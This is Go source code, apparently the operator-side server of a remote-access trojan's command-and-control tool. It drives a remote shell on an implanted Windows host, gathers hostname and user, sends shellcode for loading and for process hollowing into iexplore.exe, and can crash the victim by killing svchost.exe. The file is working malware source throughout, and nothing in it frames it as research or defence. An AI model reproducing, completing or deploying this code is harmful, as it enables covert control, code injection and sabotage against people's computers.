package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"time"
)

// Server-Sides needs to handle errors better
func shell(conn *net.Conn) {
	reader := bufio.NewReader(os.Stdin)
L: //Labeled the for loop with L if i need to break it from switch. Faster than if statements. Works.
	for {
		fmt.Print("PS > ")
		command, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Error reading input:", err)
			continue
		}
		switch command {
		case "\n":
			continue
		case "cls\n":
			continue
		case "bg\n":
			break L
		case "exit\n":
			break L
		default:
			(*conn).Write([]byte(command))
			//time.Sleep(1 * time.Second) Ma ila 3azeh only for testing
			request := make([]byte, 9000)
			read_len, err := (*conn).Read(request)
			if read_len == 0 {
				fmt.Println("Read Length is 0")
				os.Exit(0)
			}
			if err != nil {
				os.Exit(0)
			}
			reply := string(request[:read_len])
			fmt.Println(reply)
		}
	}
}

func hostinfo(conn *net.Conn) {
	fmt.Println()
	(*conn).Write([]byte("hostname\n"))
	request := make([]byte, 9000)
	read_len, err := (*conn).Read(request)
	if read_len == 0 {
		fmt.Println("Read Length is 0")
	}
	if err != nil {
		os.Exit(0)
	}
	hostname := string(request[:read_len])
	(*conn).Write([]byte("whoami\n"))
	read_len, err = (*conn).Read(request)
	if read_len == 0 {
		fmt.Println("Read Length is 0")
	}
	if err != nil {
		os.Exit(0)
	}
	whoami := string(request[:read_len])
	fmt.Print("Hostname: " + hostname) //Hostname gets recieved with \n so we can leave it this way
	fmt.Println("User: " + whoami)
}

func bsod(conn *net.Conn) bool { //Works but implant should be running as admin
	// fmt.Println("Initiating BSOD by killing")
	// (*conn).Write([]byte("taskkill.exe /f /im svchost.exe"))
	// fmt.Println("Kill Signal Sent")
	fmt.Println("Initiating BSOD by killing svchost.exe")
	(*conn).Write([]byte("SelfDestruct\n"))
	fmt.Println("Kill Signal Sent")
	reply := make([]byte, 9000)
	(*conn).SetReadDeadline(time.Now().Add(15 * time.Second))

	read_len, err := (*conn).Read(reply)
	if read_len == 0 {
		(*conn).Close()
		return true
	}
	if err != nil {
		(*conn).Close()
		return true
	}
	strReply := string(reply[:read_len])
	if strReply == "NoTime2Die\n" {
		fmt.Println(strReply)
		return false
	}
	return true
}

func playAudio(conn *net.Conn, audioFile string) {
	fmt.Println("Playing audio on the remote host :)")
	contents, err := os.ReadFile("Audio/" + audioFile)
	if err != nil {
		fmt.Println("Couldn't read the file !")
		return
	}
	(*conn).Write([]byte("play\n"))
	(*conn).Write(contents)
}

func load(conn *net.Conn, fileWShellcode string) {
	fmt.Println("Good luck")
	file, err := os.ReadFile("Shellcode/" + fileWShellcode)
	if err != nil {
		fmt.Println("Couldn't read the file !")
		return
	}
	(*conn).Write([]byte("barCode\n"))
	(*conn).Write(file)
}

func ls(conn *net.Conn) {
	(*conn).Write([]byte("ls\n"))
	request := make([]byte, 99999)
	read_len, err := (*conn).Read(request)
	if read_len == 0 {
		(*conn).Close()
		fmt.Println("Error")
		return
	}
	if err != nil {
		(*conn).Close()
		fmt.Println("Error")
		return
	}
	reply := string(request[:read_len])
	fmt.Println(reply)
}

func cd(conn *net.Conn, dir2go string) {
	(*conn).Write([]byte("cd\n"))
	(*conn).Write([]byte("cd " + dir2go))
}

func pwd(conn *net.Conn) {
	(*conn).Write([]byte("pwd\n"))
	request := make([]byte, 99999)
	read_len, err := (*conn).Read(request)
	if read_len == 0 {
		(*conn).Close()
		fmt.Println("Error")
		return
	}
	if err != nil {
		(*conn).Close()
		fmt.Println("Error")
		return
	}
	reply := string(request[:read_len])
	fmt.Println()
	fmt.Println(reply)
	fmt.Println()
}

// Still doesnt work. Potentially Client Side issue ?
// func hollow(conn *net.Conn, filePathLocal string, filePathTarget string) {
// 	fileContent, err := os.ReadFile(filePathLocal)
// 	if err != nil {
// 		fmt.Println("Couldn't read the file !")
// 		return
// 	}
// 	lenContent := strconv.Itoa(len(filePathLocal))
// 	// fmt.Println(lenContent)
// 	// os.Exit(0) //Remove this later is just for testing
// 	(*conn).Write([]byte("hollow\n"))
// 	(*conn).Write([]byte(lenContent))
// 	(*conn).Write([]byte(fileContent))
// 	buffer := make([]byte, 4000)
// 	read_len, err := (*conn).Read(buffer)
// 	if read_len == 0 {
// 		(*conn).Close()
// 		fmt.Println("Error")
// 		return
// 	}
// 	if err != nil {
// 		(*conn).Close()
// 		fmt.Println("Error")
// 		return
// 	}
// 	result := string(buffer[:read_len])
// 	if result != "OK" {
// 		fmt.Println("Somethig Went Wrong")
// 		fmt.Println(result)
// 		return
// 	}
// 	fmt.Println("Commencing Process Hollowing ...")
// 	(*conn).Write([]byte(filePathLocal))
// }

// Impliment this
func hollow2(conn *net.Conn, filePathLocal string, filePathRemote string) {
	fileContent, err := os.ReadFile(filePathLocal)
	if err != nil {
		fmt.Println("Couldn't read the file on the local machine !")
		return
	}
	//now we enter the hollowing function
	buffer := make([]byte, 1000000) //Fix buffer size later
	fmt.Println("[*]Sending Signal ...")
	(*conn).Write([]byte("hollow\n"))
	read_len, err := (*conn).Read(buffer)
	if err != nil {
		fmt.Println("Error Reading From Buffer")
		return
	}
	if read_len <= 1 {
		fmt.Println("Error with length of Buffer")
		return
	}
	bufferSnapped := buffer[:read_len]
	bufferStr := string(bufferSnapped)
	if bufferStr != "OK\n" {
		fmt.Println("[-]Couldn't initiate Hollowing")
	}
	fmt.Println("[+]Signal was recieved and acknowledged")
	//buffer = nil

	//Write the remote path
	fmt.Println("[*]Writing the Remote Path ...")
	(*conn).Write([]byte(filePathRemote))
	read_len, err = (*conn).Read(buffer)
	fmt.Println(read_len)
	if err != nil {
		fmt.Println("Error Reading From Buffer")
		return
	}
	if read_len <= 1 { //Its getting bugged here
		fmt.Println("Error with length of buffer")
		return
	}
	bufferSnapped = buffer[:read_len]
	bufferStr = string(bufferSnapped)
	if bufferStr != "OK\n" {
		fmt.Println("[-]The Remote File Does Not Exist")
		return
	}
	fmt.Println("[+]The Remote File Exists !")
	//buffer = nil //DO NOT SET THE BUFFER TO NIL IT CRASHES SHIT

	//Write the contents of the local file
	fmt.Println("[*]Transferring shellcode ...")
	(*conn).Write(fileContent)
	read_len, err = (*conn).Read(buffer)
	if err != nil {
		fmt.Println("Error Reading From Buffer")
		return
	}
	if read_len <= 1 {
		fmt.Println("Error with length of buffer")
		return
	}
	bufferSnapped = buffer[:read_len]
	bufferStr = string(bufferSnapped)
	if bufferStr != "OK\n" {
		fmt.Println("[-]Error sending the shellcode")
		return
	}
	fmt.Println("[+]Shellcode sent successfully !")
	//Add some more checks here
	fmt.Println("Process Hollowing Successful !")
}

func hollow4(conn *net.Conn) {
	(*conn).Write([]byte("hollow\n"))
}

// Impliment this
// func load2(conn *net.Conn, fileWShellcode string, code string) {
// 	fmt.Println("Good luck")
// 	file, err := os.ReadFile("Shellcode/" + fileWShellcode)
// 	if err != nil {
// 		fmt.Println("Couldn't read the file !")
// 		return
// 	}
// 	(*conn).Write([]byte(code))
// 	(*conn).Write(file)
// }

func check(conn *net.Conn) {
	buffer := make([]byte, 20000)
	(*conn).Write([]byte("check\n"))
	read_len, _ := (*conn).Read(buffer)
	bufferSnapped := buffer[:read_len]
	buffStr := string(bufferSnapped)
	fmt.Println(buffStr)
	if buffStr != "OK\n" {
		fmt.Println("Something went wrong")
		return
	}
	(*conn).Write([]byte("C:\\Program Files\\Internet Explorer\\iexplore.exe"))
}
